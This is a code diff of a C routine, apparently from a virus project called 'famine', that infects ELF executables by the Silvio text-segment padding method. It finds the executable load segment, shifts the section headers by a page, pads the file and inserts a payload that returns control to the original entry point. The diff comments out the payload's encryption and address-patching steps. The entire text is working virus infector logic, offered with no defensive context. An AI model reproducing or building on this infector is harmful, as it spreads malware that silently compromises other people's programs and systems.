@@ -23,7 +23,7 @@ void silvio_text_infection(t_famine *famine)
 
     for (size_t i = 0; i < famine->ehdr->e_phnum; i++)
     {
-        if (famine->phdr[i].p_type == PT_LOAD && famine->phdr[i].p_flags == (PF_R | PF_X))
+        if (is_text_segment(famine->phdr[i]))
         {
 
             famine->payload_vaddr = famine->text_p_vaddr + famine->phdr[i].p_filesz;
@@ -72,25 +72,25 @@ void silvio_text_infection(t_famine *famine)
     // Increase section header offset by PAGE_SIZE
     famine->ehdr->e_shoff += PAGE_SIZE;
 
-    cipher_famine_file_data(famine);
+    // cipher_famine_file_data(famine);
     if (famine->elf_32)
     {
         overwrite_payload_ret2oep(famine);
     }
     else if (famine->elf_64)
     {
-        overwrite_keysection_payload(famine);
-        overwrite_payload_getencryptedsectionaddr(famine);
         overwrite_payload_ret2oep(famine);
-        overwrite_payload_getencryptedsectionsize(famine);
-        overwrite_payload_gettextsectionaddr(famine);
-        overwrite_payload_gettextsize(famine);
+        // overwrite_keysection_payload(famine);
+        // overwrite_payload_getencryptedsectionaddr(famine);
+        // overwrite_payload_getencryptedsectionsize(famine);
+        // overwrite_payload_gettextsectionaddr(famine);
+        // overwrite_payload_gettextsize(famine);
     }
 
     // Copy until text section end
     memcpy(famine->infected_file, famine->mmap_ptr, famine->text_p_end_offset);
-    // Rewrite text section with cipher data.
-    memcpy(famine->infected_file + famine->encrypt_s_start_offset, famine->cipher, famine->encrypt_s_size);
+    // // Rewrite text section with cipher data.
+    // memcpy(famine->infected_file + famine->encrypt_s_start_offset, famine->cipher, famine->encrypt_s_size);
     // Initialize value to zero for padding.
     bzero(famine->infected_file + famine->text_p_end_offset, PAGE_SIZE);
     // Insert payload after text section end
